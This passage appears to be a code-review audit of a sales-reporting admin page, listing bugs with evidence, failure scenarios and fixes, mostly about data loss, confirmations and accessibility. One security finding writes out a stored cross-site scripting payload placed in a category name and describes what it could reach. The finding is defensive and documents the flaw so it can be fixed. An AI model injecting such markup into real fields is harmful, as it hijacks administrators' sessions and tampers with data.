<details><summary>Details: evidence, failure scenario, proposed fix</summary>

<a id="admin-settings-2"></a>
#### admin-settings-2 — Four bulk re-pull buttons run with no confirmation and no in-flight guard

*high · minor · bug · confidence high · `index.html:15660` · unverified*

**Evidence.** runBackfillSales13w (index.html:15660-15754) fires 91 sequential `POST ?action=snapshot&store=all` requests (546 store-days, reaching day 90 of Clover's ~90-day retention) straight from the onclick at 6661, with no uiConfirm. The same holds for runReSnapshot (15209-15266: up to 30 days x all stores via items-snapshot), resnapshotRecent (17261-17293: any start-to-end range, uncapped) and runBackfillCategoryOrders (15587-15657: 637 read-modify-writes of stored KV snapshots). None of them disables its button, so a second tap starts a second parallel loop. Compare runRepair (16568-16570), which uses `uiConfirm(..., { title: 'Run repair?', okText: 'Repair', danger: true })` with a per-store summary. CLAUDE.md rules 1 and 7: never re-pull a healthy date; DB mutations and KV overwrites of stored history need explicit confirmation with a summary.

**Failure scenario.** A superuser scrolling on a phone brushes 'Backfill Last 13 Weeks', which has the same green primary style as 'Run health check'. With no prompt, 546 store-days are re-pulled from Clover and rewritten in D1 and KV, with no magnitude guard or backup (admin-settings-1). A double tap on 'Re-snapshot Item Sales' starts two overlapping 30-day loops, doubling the load on Clover and interleaving the status text.

**Proposed fix.** Frontend-only; adds safety. Give each of the four buttons an id and at the top of each function:
```js
const btn = el('bf-sales-btn');
if (btn.disabled) return;
const ok = await uiConfirm(`Re-pull ${dateList.length} date(s) (${oldest} to ${newest}) for ${storeLabel} from Clover and overwrite the stored figures. This includes dates that are already healthy and is not backed up; dates near Clover's ~90-day window can come back short and lose refunds. For damaged dates use the Repair console above.`, { title: 'Overwrite stored history?', okText: 'Re-pull', danger: true });
if (!ok) return;
btn.disabled = true;
try { /* existing loop */ } finally { btn.disabled = false; }
```
Apply this to runBackfillSales13w, runReSnapshot, resnapshotRecent and runBackfillCategoryOrders. Optionally drop dates older than 80 days from the list; refusing a write only adds safety. See admin-settings-1 for the worker-side fix.

<a id="admin-settings-3"></a>
#### admin-settings-3 — Saving category overrides wipes the entire override map when the read-before-write fails

*high · minor · bug · confidence high · `index.html:17144` · unverified*

**Evidence.** index.html:17144-17151: `let existing = { items: {}, patterns: [], l3Map: {} }; try { const getResp = await fetch(`${WORKER_BASE}?action=item-overrides`, {credentials:'include'}); if (getResp.ok) existing = await getResp.json(); } catch {}`. The function then POSTs `{ items, patterns, l3Map, l3Rules }` built from `existing` (17240). The worker replaces each key wholesale: `next.items = body.items` (worker.js:19607), `next.patterns = body.patterns` (19623), `next.l3Map = body.l3Map` (19660), `next.l3Rules = body.l3Rules` (19679), then `put(ITEM_OVERRIDES_KEY, ...)` (19682) with no backup. Reproduced by slicing the real function into node with a 503 GET: the POST body was {"items":{"name:widget":"Home"},"patterns":[],"l3Map":{},"l3Rules":[]} and the status read 'Saved 1 item assignment'. loadUncategorized has the same gap: `const ovData = ovResp.ok ? await ovResp.json() : {}` (16994) shows 'No L3 rules yet.' when the read failed.

**Failure scenario.** While a superuser assigns one item, the item-overrides GET hits a transient 5xx, a network drop or a worker mid-deploy. Every stored item override, prefix pattern, admin l3Map entry and L3 rule is replaced by that single assignment. The next nightly snapshot books every previously overridden product back to Custom Sales or Uncategorized across all stores, and nothing reports it.

**Proposed fix.** Frontend-only. Fail closed:
```js
let existing;
try {
  const getResp = await fetch(`${WORKER_BASE}?action=item-overrides`, { credentials: 'include' });
  const j = await getResp.json();
  if (!getResp.ok || j.error || typeof j.items !== 'object') throw new Error(j.error || `HTTP ${getResp.status}`);
  existing = j;
} catch (e) {
  setOverridesStatus(`Could not read the current overrides (${escapeHtml(e.message)}). Nothing was saved, so nothing was overwritten. Try again.`, 'error');
  return;
}
```
In loadUncategorized, show an error instead of rendering an empty rules table when ovResp is not ok.

<a id="admin-settings-4"></a>
#### admin-settings-4 — L3 rule removal is by stale index, so a second save deletes a different rule

*high · minor · bug · confidence high · `index.html:17162` · unverified*

**Evidence.** renderL3Rules renders `data-index="${i}"` against the list loadUncategorized fetched (16941-16955). saveCategoryOverrides re-fetches `existing.l3Rules` and removes by position: `const dropIdx = new Set([...document.querySelectorAll('input.override-l3rule-del:checked')].map(cb => Number(cb.dataset.index))); ... l3Rules = l3Rules.filter((_, i) => !dropIdx.has(i));` (17162-17165). New rules are `unshift`ed to the front (17204), which shifts every index. After a successful save the table is not re-rendered and the ticked checkboxes stay ticked (17252-17255). Reproduced in node with the real function: stored [A,B,C], tick #2, save gives [A,C]; assign another item and save again (checkbox still ticked) gives [A].

**Failure scenario.** A superuser ticks 'remove' on rule #2 and saves, then assigns another item on the same screen and saves again. The second save silently deletes whichever rule now sits at index 1, a rule they never chose. The status says '1 L3 rule removed' as if it were the one they picked. The table still shows the old list, so nothing looks wrong, and future snapshots lose that L3 attribution.

**Proposed fix.** Frontend-only. Remove by identity and refresh after saving. In renderL3Rules use `data-sig="${escHtml(`${r.type}|${r.value}|${r.l3}`)}"` instead of data-index. In the save: `const dropSig = new Set([...document.querySelectorAll('input.override-l3rule-del:checked')].map(cb => cb.dataset.sig)); const before = l3Rules.length; l3Rules = l3Rules.filter(r => !dropSig.has(`${r.type}|${r.value}|${r.l3}`)); const l3RulesRemoved = before - l3Rules.length;`. After a successful POST, re-GET item-overrides and call `renderL3Rules(ov.l3RuleOwners)`, which also clears the checkboxes.

<a id="admin-settings-1"></a>
#### admin-settings-1 — items-snapshot and snapshot overwrite KV/D1 history with no magnitude guard and no backup

*high · major · bug · confidence high · `worker.js:18987` · unverified*

**Evidence.** The two data-loss guards live only in rebuildItemSnapshot: the magnitude guard `if (d1Total > 0 && computedNet < d1Total * BACKFILL_MIN_D1_RATIO)` (worker.js:2912-2928) and the backup (2935-2946). Only repair-run and backfill-items-snapshots use that function. The endpoints this page actually calls never got either guard: (a) `items-snapshot` (19027-19041) skips only when `itemData.orderCount === 0` and the existing snapshot has categories, then runs `await saveItemSalesSnapshot(env, store, dateParam, itemData);` with no D1 comparison and no backup. (b) `snapshot` (18792-18817) calls `saveItemSalesSnapshot(env, store, dateStr, itemAgg)` whenever `elements.length > 0`, then fetchAggregateAndSnapshot (4744-4780) overwrites daily_sales.total. Its only guards are is_manual_override, `orderCount === 0` and `total < 0`. (c) resnapshot-clienttime (21129) goes down the same path over any range. Frontend callers: runReSnapshot (index.html:15250), runIsrResnapshotRange (16802) and resnapshotRecent (17280) hit items-snapshot; runBackfillSales13w (15720) and runSrrResnapshotMonth (16243) hit snapshot. MEMORY.md: 'One implementation of each data-loss guard ... Two copies of a guard drift'. lessons.md 2026-08-03: a BL4 re-pull got 153 of 241 orders and overwrote $3,229.91 with $2,124.47.

**Failure scenario.** A superuser clicks 'Backfill Last 13 Weeks', which re-pulls 91 days x 6 stores. Near Clover's ~90-day retention edge the pull returns fewer orders, not zero. `snapshot` writes the short item snapshot to KV and the short total to D1. The two records now agree, so repair-health rates the day 'ok' (snapNet >= d1Net x 0.99) and the Repair console can no longer see the loss. No backup exists to restore. With 'Re-snapshot Item Sales' (items-snapshot), the complete KV snapshot is replaced by the partial one, again with no backup.

**Plan.** FUTURE PLAN. 1) Worker: make items-snapshot call rebuildItemSnapshot(env, store, date, {catMap, overrides, itemCosts, d1Total, todayStr, force:true, backupPrefix}) for each store. Load d1Total from daily_sales and fail closed (skip with a reason) if the D1 read errors. Write a repair-backup-meta record (90-day TTL) before the first write, so every overwrite appears in the Backups list and can be restored. Keep the response shape {ok, date, results:{STORE:{ok, skipped?, reason?}}}; callers only read error/resp.ok. 2) Worker: in `snapshot` and snapshotDayByClientTime, for any date other than ET today, apply the same rule before either write. Refuse when the new item net or new total is below the stored KV/D1 figure x BACKFILL_MIN_D1_RATIO. Back up the prior KV snapshot (same prefix) and the prior daily_sales row: either KV `d1-backup:<id>:<store>:<date>` with a TTL, or a new daily_sales_audit table, whose migration must land before the worker. 3) Frontend, only after the worker is live: show per-date skip reasons, and replace the blind-range buttons with 'health check, then repair the listed dates'. DEPLOY ORDER: worker first. It only adds refusals and keeps the response contract, so today's frontend keeps working. The frontend changes that read new fields follow. RISKS: a genuine downward correction (e.g. a late refund) gets refused; the 1% ratio tolerates normal drift and the refusal is shown. Backups add KV puts against the daily quota. The nightly cron path for today must not be routed through the new refusal. VERIFY offline, stubbing the platform rather than the code: drive worker.fetch with globalThis.fetch returning a partial Clover day (153 of 241 orders) against node:sqlite D1 seeded with the full total. Assert skipped, KV and D1 byte-identical, no backup spent. Control case: the full day, assert written with a backup. Never verify by re-pulling a healthy production date. After deploying, poll until several requests in a row show the new behaviour (~180 s rollout).

<a id="admin-settings-5"></a>
#### admin-settings-5 — Manual Labor Hours locks the whole store-day row, so that day's sales and budget stop updating

*high · major · bug · confidence high · `index.html:15863` · unverified*

**Evidence.** runManualLaborSingle `await _submitOverride([{ store, date, labor_hours: Number(hours) }], 'mlh-status')` (15863) and runManualLaborBulk (15874) post without `markOverride:false`, so the worker defaults to `const markOverride = body.markOverride === false ? 0 : 1;` (worker.js:21221) and sets is_manual_override=1. That flag makes the nightly fetchAggregateAndSnapshot skip the whole row: `if (existing && existing.is_manual_override) { ... return data; }` (4750-4755). It also freezes budget, week and every other column against the sheet import (15733-15760), and makes classifyReportingStatus answer 'reported' even with total NULL (5908). The Labor page avoids exactly this: `// markOverride:false — is_manual_override freezes the WHOLE row` (index.html:32902-32907), pinned by scripts/test-labor-plan.mjs §10 ('stamping it on an hours save would silently freeze that store-day's BUDGET too').

**Failure scenario.** A superuser enters labor hours for BL4 for today, or bulk-pastes a week that includes today. The row is created with total NULL and is_manual_override=1. At end of day the snapshot skips it, so the day's sales are never written, the reporting status still says 'reported', and the budget stops following the sheet. For past dates, the sales total and budget are frozen against every later correction, and no screen can unlock a row.

**Plan.** FUTURE PLAN. 1) Migration (additive): `ALTER TABLE daily_sales ADD COLUMN labor_hours_manual INTEGER DEFAULT 0`. 2) Worker: an hours-only payload with a new `lockHours:true` sets labor_hours_manual=1 and leaves is_manual_override alone; importSheetToD1's labor_hours CASE honours labor_hours_manual. 3) Frontend: runManualLaborSingle and runManualLaborBulk send `{ markOverride:false, lockHours:true, entries }`. DEPLOY ORDER: migration, then worker (it ignores the flag when absent, so the old frontend is unaffected), then frontend (it needs a worker that accepts lockHours). INTERIM, frontend-only and safe: refuse dates on or after ET today in both functions, and add a uiConfirm plus copy stating that the entry freezes the whole store-day (sales, budget) against the nightly snapshot and the sheet. RISK: without step 2, markOverride:false alone would let the sheet overwrite the hours. VERIFY with a node:sqlite harness in the style of test-labor-plan.mjs: after an hours-only admin write, fetchAggregateAndSnapshot still writes the total and the sheet import leaves labor_hours alone.

<a id="admin-settings-7"></a>
#### admin-settings-7 — SRR/ISR re-snapshot prompts promise safety the endpoints do not provide

*medium · minor · bug · confidence high · `index.html:16211` · unverified*

**Evidence.** runSrrResnapshotMonth (16211-16215) confirms: 'Days flagged as manual overrides will be preserved. Existing values that match Clover will not change.' In fact it POSTs `snapshot` for every day of the month, including days after today (16205-16208), and that action rewrites each day's D1 total and KV item snapshot unconditionally (admin-settings-1). It then counts every fulfilled request as refreshed: `if (r.status === 'fulfilled') done++` (16247-16250), even when the worker skipped the day under a guard. runIsrResnapshotRange (16782-16785) has no danger flag and can span up to 366 days (the item-l2-totals cap). Its hint says 'Manual-override days are preserved' (16771), but items-snapshot never reads is_manual_override.

**Failure scenario.** A superuser reconciling a 5-month Clover report sees March off by $120 and clicks Re-snapshot. The prompt says values that match Clover won't change, so they confirm. All 31 March days, older than Clover's ~90-day window, are re-pulled. The partial ones overwrite healthy KV snapshots and D1 totals, and the status reads 'Re-snapshot complete — 31/31 day(s) refreshed.'

**Proposed fix.** Frontend-only. Rewrite both prompts to say what actually happens, e.g. 'Re-pulls all N days of <month> (oldest <date>) from Clover and overwrites the stored daily totals and item snapshots, including days that already match. Not backed up. Days older than ~90 days can come back short.', with `{ title: 'Overwrite a month of history?', okText: 'Re-pull', danger: true }`. Stop the date list at ET yesterday. Remove the false 'Manual-override days are preserved' hint. Count a day as refreshed only when `data.results[store]?.ok` and it wasn't skipped.

<a id="admin-settings-8"></a>
#### admin-settings-8 — A failed D1 read silently disables the magnitude guard, and the health check calls it 'All clear'

*medium · minor · bug · confidence high · `worker.js:27033` · unverified*

**Evidence.** repair-run loads the reference totals with `.bind(allDates[0], allDates[allDates.length - 1]).all().catch(() => ({ results: [] }))` (worker.js:27031-27034). backfill-items-snapshots (19354-19356) and repair-health (26859-26861) do the same. An empty result makes every d1Total 0. rebuildItemSnapshot's magnitude guard is gated on `if (d1Total > 0 && ...)` (2913), so it never runs, and the zero-order guard loses its D1 branch (2895). In the UI, runRepairHealth prints '<strong>All clear.</strong> ... nothing below the threshold' in green whenever short + missing is 0 (index.html:16547-16550). That is exactly what a D1 failure produces, because every day becomes 'no-d1'; the only hint is a small grey notes line.

**Failure scenario.** D1 returns a transient error while a superuser clicks 'Repair 12 dates'. Every date is re-pulled with d1Total = 0, so a short Clover pull is written because nothing compares it to D1 (CLAUDE.md rule 4). The same outage during a health check shows a green 'All clear' over a range that is actually damaged.

**Proposed fix.** Worker-only; self-contained; adds safety. Replace the three `.catch(() => ({ results: [] }))` with try/catch that returns 503 `{ error: 'D1 unavailable — nothing was written' }` (repair-run, backfill-items-snapshots) or `{ error: 'D1 unavailable — cannot judge' }` (repair-health). In repair-run, also skip any target with no d1Totals entry, with 'no D1 total to verify against'. Frontend: `needsCount === 0 && !s.noD1 ? 'All clear' : ...`, and use tone 'info' when s.noD1 > 0.

<a id="admin-settings-9"></a>
#### admin-settings-9 — repair-run re-pulls whatever list it is given without re-checking that the date is still unhealthy

*medium · minor · bug · confidence medium · `worker.js:27054` · unverified*

**Evidence.** repair-run reads `before` (27047-27048) and d1Total (27046), then calls `rebuildItemSnapshot(env, store, date, { ..., force: true, backupPrefix })` (27054-27057) without checking `beforeNet < d1Total * BACKFILL_MIN_D1_RATIO`. The magnitude guard only refuses a pull that is itself short, so a healthy date with a normal-looking pull gets overwritten. The UI sends `_rhNeeds` (index.html:16582), the list from the last health check, which can be stale: another tab or superuser may have repaired or restored since.

**Failure scenario.** Two superusers, or two tabs, run the health check. One repairs BL1 2026-06-20. The other clicks Repair later with the stale list, and BL1 2026-06-20, now healthy, is re-pulled. If refunds for that day have aged out of Clover, the fresh net is higher than the truth, passes the guard and overwrites the good snapshot, which is exactly what rule 1 forbids.

**Proposed fix.** Worker-only; one added guard. After reading `before`: `if (beforeNet !== null && d1Total > 0 && beforeNet >= d1Total * BACKFILL_MIN_D1_RATIO) { results.push({ store, date, outcome: 'skipped', note: 'already healthy — re-pull refused', beforeNet, d1Total }); continue; }`. The UI already reports skipped dates as 'refused by the guards'.

<a id="admin-settings-10"></a>
#### admin-settings-10 — Repair backups: the index is written after the overwrites, and the backup copies never expire

*medium · minor · bug · confidence high · `worker.js:27080` · unverified*

**Evidence.** rebuildItemSnapshot writes each per-date backup with no TTL: `await env.SALES_SNAPSHOTS.put(`${ctx.backupPrefix}:${store.toLowerCase()}:${dateStr}`, prior);` (worker.js:2940). repair-run writes the only index of those copies after every date has been overwritten, outside any try: `await env.SALES_SNAPSHOTS.put(`repair-backup-meta:${backupId}`, ..., { expirationTtl: 90*24*3600 })` (27077-27082). repair-restore requires that meta record (27141-27144). The UI says 'Backups expire after 90 days' (index.html:6570). saveSnapshot's own comment notes that KV puts can fail on the daily quota (4626-4628).

**Failure scenario.** A 40-date repair runs down the KV daily put quota. The per-date backups and writes succeed, but the final meta put throws. The worker errors and the UI says 'Repair failed', yet 40 snapshots were overwritten, and their backups sit under keys that no screen lists and repair-restore can't find. The undo is lost (rule 2). Separately, every repair leaves full snapshot copies in KV forever once the meta expires.

**Proposed fix.** Worker-only; adds safety. Write the meta with the planned dates (and TTL) before the loop, then update it inside try/catch with the list actually backed up, logging on failure and still returning the backupId. Add `{ expirationTtl: 90 * 24 * 3600 }` to the backup put at 2940.

<a id="admin-settings-11"></a>
#### admin-settings-11 — Restore confirmation names a count, not the store-dates it will overwrite

*medium · minor · ui-ux · confidence high · `index.html:16627` · unverified*

**Evidence.** restoreRepairBackup (16626-16629) says only: `Roll ${dateCount} date(s) back to the snapshots saved in this backup, discarding what is stored now.` The backups table shows only Taken, By and a count of dates (16614-16619), although repair-backups already returns each backup's `dates` list (worker.js:27115-27116 spreads `...m`). `b.by` and `b.note` go into innerHTML unescaped (16616). CLAUDE.md rule 7 asks for a summary of exactly what will be affected.

**Failure scenario.** Three backups from the same afternoon are listed as 3, 3 and 5 dates. The superuser restores the wrong one and replaces a good, repaired BL4 day with its short pre-repair snapshot, never having been shown which stores or dates it touches.

**Proposed fix.** Frontend-only. Render the dates in the table (`b.dates.map(d => escapeHtml(`${d.store} ${d.date}`)).join(', ')`) and pass them into the confirm: `uiConfirm(`Overwrite these stored snapshots with the backed-up copies: ${list}. The current state is saved as a new backup first.`, { title: 'Restore backup?', okText: 'Restore', danger: true })`. Escape by and note with escapeHtml, and disable the clicked Restore button until the restore finishes.

<a id="admin-settings-12"></a>
#### admin-settings-12 — 'Repair N dates' always fails when the health check lists more than 60

*medium · minor · ui-ux · confidence high · `index.html:16582` · unverified*

**Evidence.** runRepair sends the whole list: `body: JSON.stringify({ dates: _rhNeeds.map(c => ({ store: c.store, date: c.date })) })` (16582). repair-run refuses more than 60: `const MAX_REPAIR = 60; if (requested.length > MAX_REPAIR) ... 400` (worker.js:26997-27001). The health check can return up to 480 cells (MAX_CELLS, 26843), and the button reads `Repair ${data.needsRepair.length} dates` (16544).

**Failure scenario.** After a multi-week loss like BL1's, the check lists 81 short dates. Clicking 'Repair 81 dates' returns 'Repair failed: too many dates (81); cap is 60 per run'. In the very scenario the console was built for, the only way forward is guessing a narrower range.

**Proposed fix.** Frontend-only. Send `_rhNeeds.slice(0, 60)` (already sorted biggest gap first), label the button 'Repair 60 of 81 dates (largest first)', and say in the confirm that the rest remain. The post-repair re-check (16596) then lists what's left for another click.

<a id="admin-settings-13"></a>
#### admin-settings-13 — Clover category names and Item Master descriptions are rendered as HTML

*medium · minor · security · confidence high · `index.html:22812` · unverified*

**Evidence.** renderCategoryCosts writes the L3 name raw: `...truncate" title="${c.l3.replace(/"/g,'&quot;')}">${c.l3}</span>` (22812), and the L2 header (22802) likewise. The catalog includes every admin l3Map key (worker.js:19789-19803). Those keys are raw Clover category names: they arrive via _debug.unmappedL3 (3953), appear in the 'Uncategorized L3 categories' table, and are saved by `l3Map[l3] = l2` (index.html:17222-17228). loadCategoryCosts runs on every visit to the page (22915). ieRender does the same with Item Master descriptions, `${desc || '<span ...>—</span>'}` (22680); desc comes from an uploaded cell's textContent (22546) or the Add form. Elsewhere this page escapes (16855, 17069, 16743).

**Failure scenario.** Someone with Clover inventory access creates a category named `<img src=x onerror=...>` at one store. It shows up, escaped, in the Uncategorized L3 list, and a superuser assigns it an L2. From then on, every visit to Admin Settings runs that script in the superuser's session, where it can call repair-run, manual-override or item-overrides. Less adversarially, an Item Master description like 'CABLE <6FT>' vanishes from the editor.

**Proposed fix.** Frontend-only. Use escapeHtml: `>${escapeHtml(c.l3)}</span>`, `${escapeHtml(l2)}`, `title="${escapeHtml(c.l3)}"` and `data-l3="${escapeHtml(c.l3)}"` in renderCategoryCosts; `${desc ? escapeHtml(desc) : '<span ...>—</span>'}` and `title="${escapeHtml(desc)}"` in ieRender.

<a id="admin-settings-14"></a>
#### admin-settings-14 — Item Master upload silently replaces every stored cost, and the per-item editor keeps showing the old list

*medium · minor · bug · confidence high · `index.html:22551` · unverified*

**Evidence.** importItemCosts (22551-22583) parses the file and POSTs `{ items }` with no confirmation. Without `merge`, the worker path is an authoritative replace, `finalItems = cleaned` (worker.js:19744-19746), and the old map is not backed up. The only feedback, after the fact, is `Uploaded ${data.count} items`. The editor cache loads once (`if (ieLoaded) return;`, 22634) and is never reset after an upload.

**Failure scenario.** A superuser uploads a filtered export with 40 items, e.g. one vendor tab of the sheet. Every other IM# cost is deleted. The next snapshots cost those lines by category fallback or not at all, and 'Re-snapshot history to apply' bakes that into history. The 'Edit individual items' panel still lists the old costs, so it looks as if nothing changed.

**Proposed fix.** Frontend-only; adds safety. Before the POST, GET item-costs for the current count and confirm: `uiConfirm(`Replace all ${cur.count} stored item costs with the ${count} in ${file.name}? ${removed} item(s) not in this file lose their cost. This cannot be undone.`, { title: 'Replace Item Master?', okText: 'Replace', danger: true })`. After a successful upload, set `ieLoaded = false; ieItems = null;` and re-render if the editor is open.

<a id="admin-settings-15"></a>
#### admin-settings-15 — 'Rebuild Week Summaries' only reaches the current calendar year, so Jan–Mar skips the prior year's weeks

*medium · minor · bug · confidence high · `worker.js:27324` · unverified*

**Evidence.** runRebuildWeekSummaries sends `const year = new Date().getFullYear();` as `?action=rebuild-week-summaries&year=${year}` (index.html:15542, 15558). runBackfillSales13w omits it and the worker defaults to `String(new Date().getUTCFullYear())` (worker.js:27298). The week list is `WHERE week IS NOT NULL AND date LIKE ? AND date <= ? ... LIMIT ?`, bound to `${year}-%` (27321-27328). The panel copy says 'Re-rolls the trailing 13 weeks'.

**Failure scenario.** On 2027-01-20 a superuser repairs December data and runs Rebuild Week Summaries. The query sees only 2027 dates and returns about 3 weeks. The ten T13 weeks from Oct–Dec 2026 keep their stale summaries, and the status reads 'Done — 21 summaries written across 3 weeks.'

**Proposed fix.** Worker-only; backward compatible. Bound the window by date rather than calendar year: `WHERE week IS NOT NULL AND date >= ? AND date <= ?`, with the lower bound at anchor minus (trailing + 1) x 7 days. Each week's year already comes from its start_date (27333). Frontend: stop sending `&year=`. Either side is safe on its own.

<a id="admin-settings-17"></a>
#### admin-settings-17 — SRR hides a failed D1 read behind a green 'Loaded' and skips its post-write check

*medium · minor · bug · confidence high · `index.html:16052` · unverified*

**Evidence.** _srrFetchOurMonths catches the error, shows it and returns `{}` (16147-16150). runSrrParse then immediately overwrites that message with `_renderSrrComparison(); _setSrrStatus(`Loaded ${monthly.length} month(s) for ${store}. Compare below.`, 'ok');` (16049-16052). In runSrrResnapshotMonth the sanity check sits behind `if (cloverEntry && newOurEntry)` (16262), so when the refresh fails it is skipped and the run ends with 'Re-snapshot complete — N/N day(s) refreshed.' in the ok tone (16273). runSrrImportDaily does the same after writing overrides (16127-16129).

**Failure scenario.** After a month is re-snapshotted, the monthly-totals read times out. The table shows '—' under Ours, the status is a green 'complete', and the only check of what was just written to D1 never ran (CLAUDE.md rule 4).

**Proposed fix.** Frontend-only. Have _srrFetchOurMonths return null on failure; in all three callers, `if (!ourByMonth) return;` after the error is shown. In runSrrResnapshotMonth, report 'Re-snapshot finished but the D1 totals could not be re-read — verify before trusting it' with tone 'error'.

<a id="admin-settings-18"></a>
#### admin-settings-18 — L3 Category Costs is unusable on a phone: the category name column is 10px wide

*medium · minor · ui-ux · confidence high · `index.html:22811` · unverified*

**Evidence.** Each row is `flex items-center gap-3` containing the name (`flex-1 min-w-0 ... truncate`), a fixed `w-28` sales tag and a `$ [w-24 input] /unit` group (22811-22820). Rendered at 393x852 in Chromium (static build, fetch stubbed), every name span measured 10px wide, so 'FG BL CONSUMABLES - FOOD - BEVERAGES' shows as an ellipsis. The Item Master editor rows (22678-22686) have the same shape.

**Failure scenario.** A superuser pricing categories on their phone sees a column of '…' beside the cost inputs and can't tell which L3 each price belongs to. A cost typed into the wrong row is saved for all stores and baked into history on the next re-snapshot.

**Proposed fix.** Frontend-only markup change in renderCategoryCosts: make the row `flex flex-wrap sm:flex-nowrap items-center gap-x-3 gap-y-1`, give the name `basis-full sm:basis-auto sm:flex-1 min-w-0 break-words` (no `truncate` below sm), and make the tag `sm:w-28`. Do the same for ieRender's description.

<a id="admin-settings-19"></a>
#### admin-settings-19 — Several text colours on this page fail 4.5:1

*medium · minor · accessibility · confidence high · `index.html:16459` · unverified*

**Evidence.** Computed from the token values against the real ground. (1) The _rhTile 'good' tone is `text-op-good` (16459), which has no light-mode remap; only text-op-bad/warn (186-187) and text-accent-green (150) are remapped. Chromium painted 'Healthy', 'Needs repair 0' and 'Recoverable $0.00' as rgb(34,197,94) in light: 2.28:1 on white, and 18px bold doesn't count as large text. (2) SRR/ISR deltas use `text-green-600`/`text-amber-600`/`text-red-600` with no dark variant (16176-16177, 16737-16739, 16751-16753): 3.30 and 3.19 in light; red-600 is 3.68 on op-panel in dark (4.10 on OLED). (3) The Item Master file button, `file:text-[#3BB54A]` on `/10` (6824), is 2.43 in light. (4) The error tone `text-red-600` on bg-red-50 (e.g. 15229, 22445) is 4.41. (5) No-sales category rows use `opacity-60` (22811): the inkDim text drops to 2.55 in light and 2.89 in dark.

**Failure scenario.** In light mode the Repair console's green 'Healthy 30' reads at 2.28:1. The reconciliation deltas that show which month is off fall below AA in light (green, amber) and in dark (red).

**Proposed fix.** Frontend-only. Add `html:not(.dark) .text-op-good { color:#166534; }` next to index.html:186 (7.13:1 on white; dark keeps #22c55e at 7.81). For the SRR/ISR deltaCls, use the remapped utilities: `off ? (delta > 0 ? 'text-op-warn font-semibold' : 'text-op-bad font-semibold') : 'text-accent-green'` (light 7.09 / 7.20 / 7.13; dark 8.28 / 6.43 / 7.81). Item file button: `file:text-[#166534] dark:file:text-[#3BB54A]` (6.51 in light). Error tone: `text-red-700` (5.91). Dim only the 'no sales' tag, not the whole row.

<a id="admin-settings-20"></a>
#### admin-settings-20 — Phone: every field zooms on iOS, dark-mode controls render light, and tap targets are 34–36px

*medium · minor · ui-ux · confidence high · `index.html:6516` · unverified*

**Evidence.** Every input, select and textarea on the page is `text-sm` or `text-xs`; the measured computed sizes at 393px were 14px and 12px. There is no 16px rule, and the viewport is `width=device-width, initial-scale=1.0` (index.html:5), so iOS Safari zooms on focus. In dark mode `color-scheme` computes to `normal` (DESIGN.md §4.8 trap 4; other pages scope `color-scheme:dark`, e.g. 5280 and 3708). So the seven date inputs' calendar glyphs, the checkboxes and the number spinners are painted for a light UI on the dark panel. 22 of the 25 visible buttons measured under 44px (minimum 34px), including Restore (16618) and the Item Master '×' delete toggle (`px-1`, 22685).

**Failure scenario.** A superuser opens the Repair console on a phone, taps the start date, and the page zooms. In dark mode the date picker icon is nearly invisible. The '×' that marks an item cost for deletion sits a few pixels from the cost input.

**Proposed fix.** Frontend-only CSS in the first <style> block:
```css
@media (max-width:1023px){
  #page-admin-settings input:not([type=checkbox]):not([type=file]),
  #page-admin-settings select, #page-admin-settings textarea { font-size:16px; }
  #page-admin-settings button { min-height:44px; }
}
.dark #page-admin-settings { color-scheme: dark; }
```
Give the ie-list delete button `min-w-[44px] min-h-[44px]` and an aria-label.

<a id="admin-settings-22"></a>
#### admin-settings-22 — L3 Category Costs shows 'no sales' for every admin-mapped category

*medium · minor · bug · confidence high · `worker.js:19830` · unverified*

**Evidence.** The catalog was widened to include l3Map-only categories (worker.js:19773-19803, whose comment cites 'Indy Products' with $16,592 of BL16 bin sales). The 7-day sales tally still filters to the built-in map: `if (!Object.prototype.hasOwnProperty.call(L3_TO_L2, key)) continue;` (19830). Those lines' l3Rows are keyed by the raw Clover L3 (`if (l2Source === "clover-l3" && l3) l3Key = l3;`, 4043-4044), so the tally drops them. The UI then shows them as 'no sales' at opacity-60 and hides them under 'With sales only' (index.html:22786-22788, 22808-22811).

**Failure scenario.** The superuser ticks 'With sales only' to price what actually sells. Indy Products, the category the catalog was widened for, is filtered out; without the filter it sits at the bottom, dimmed and labelled 'no sales'.

**Proposed fix.** Worker-only, read path. Use the costable set computed just above it: `if (!Object.prototype.hasOwnProperty.call(costableL3, key)) continue;`.

<a id="admin-settings-6"></a>
#### admin-settings-6 — Manual sales overrides and the daily-CSV import overwrite and permanently lock D1 totals with no backup, summary or undo

*medium · major · bug · confidence high · `index.html:15772` · unverified*

**Evidence.** runManualSalesSingle and runManualSalesBulk (15817-15853) post straight to _submitOverride (15772) with no uiConfirm. runSrrImportDaily (16093-16113) confirms only 'Import N days ... as Manual Overrides? Days already flagged ... will be skipped.' It shows no current values or deltas, yet it overwrites every non-override day in the month, healthy ones included. The worker upsert (worker.js:21266-21276) sets is_manual_override=1 without reading or saving the prior row, and nothing in index.html or worker.js clears the flag. Store is only checked for presence (21227-21231), so a bulk row `BL01,2026-01-28,7761` creates and locks a phantom row. The copy at 6763 says 'Use the Manual Sales Override tool above to revert any specific day', but the prior value isn't kept, so there is nothing to revert to.

**Failure scenario.** An admin imports a Clover per-day Sales Report for August for BL2. All 31 D1 totals are replaced with the report's Net Sales and locked. That figure is defined differently from the item-pipeline total that retail and bin come from, so total no longer equals retail + bin + other. The prior totals are gone, the nightly job and every backfill skip those rows forever, and a typo in one cell can only be fixed by retyping the old figure from memory.

**Plan.** FUTURE PLAN. 1) Worker (additive): in manual-override, read the existing row first, save it (KV `override-backup:<ts>:<store>:<date>` with a 90-day TTL, or a daily_sales_audit table via a migration applied first), and return `before` in each result. Validate store against ALL_STORES and that the date is a real calendar date. 2) Worker: a new superuser action `manual-override-clear` {store, date} that sets is_manual_override=0, optionally restoring `before`. 3) Frontend: a preview step that fetches the current rows and shows a before/after table in a danger uiConfirm; skip import rows whose delta is under $1; add an Unlock control. DEPLOY: migration, then worker, then frontend (the frontend calls the new action). RISK: extra KV writes. VERIFY with node:sqlite: an override stores a backup and returns `before`; clearing flips the flag and the next fetchAggregateAndSnapshot writes the total.

<a id="admin-settings-16"></a>
#### admin-settings-16 — Choosing a template in the sticker editor makes it the label every store prints

*medium · major · bug · confidence high · `index.html:25627` · unverified*

